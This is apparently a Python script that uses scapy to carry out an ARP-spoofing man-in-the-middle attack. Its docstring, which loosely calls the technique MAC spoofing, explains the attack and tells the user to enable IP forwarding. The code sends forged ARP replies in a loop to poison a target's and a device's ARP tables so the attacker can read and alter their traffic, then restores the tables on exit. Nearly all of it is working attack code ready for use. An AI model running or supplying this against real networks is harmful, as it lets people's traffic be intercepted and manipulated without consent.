'''
MAC spoofing is mainly used to sniff packets being sent between
a host and the default gateway. To change your mac address to look
like a different devices you need to change the ARP table on the host
device. This can be done when a device sends an ARP request for the
default gateway the attacker sends a packet saying that they are the device.
This then tricks the host into sending all packets to the attacker.
Which the attacker can read and manipulate before being sent to the
actual router.

In this script we just send the ARP packets constantly instead
of waiting for a ARP request to be made.

Use this command below to enable packet forwarding.
Otherwise you wont be able to have a internet connection.
sudo sysctl -w net.ipv4.ip_forward=1
'''

from scapy.all import conf, getmacbyip, ARP, send

# Network interface to use
interface = 'wlan0'

# Device you want to be ip address
device_ip = '192.168.0.188'

# The device you want to make think you are a different device
# To make all devices on a network think you are a different device
# you need to loop through all hosts and send the ARP response packet
target_ip = '192.168.0.88'

def spoof(destinationIP, sourceIP):
    destinationMAC = getmacbyip(destinationIP) # Get the mac address of the target
    packet = ARP(op=2, hwdst=destinationMAC, pdst=destinationIP, psrc=sourceIP) # Create the packet, op=2 meaning we are replying
    send(packet, iface=interface, verbose=False) # Sending the packet using the specified interface

def restore(destinationIP, sourceIP):
    destinationMAC = getmacbyip(destinationIP)
    sourceMAC = getmacbyip(sourceIP)
    packet = ARP(op=2, pdst=destinationIP, hwdst=destinationMAC, psrc=sourceIP, hwsrc=sourceMAC)
    send(packet, iface=interface, verbose=False)

try:
    print("Spoofing...")
    while True: # Constantly sending packets
        spoof(target_ip, device_ip)
        spoof(device_ip, target_ip)
except KeyboardInterrupt:
    print("Restoring...") # Changing the ARP table back to normal
    restore(target_ip, device_ip)
    restore(device_ip, target_ip)
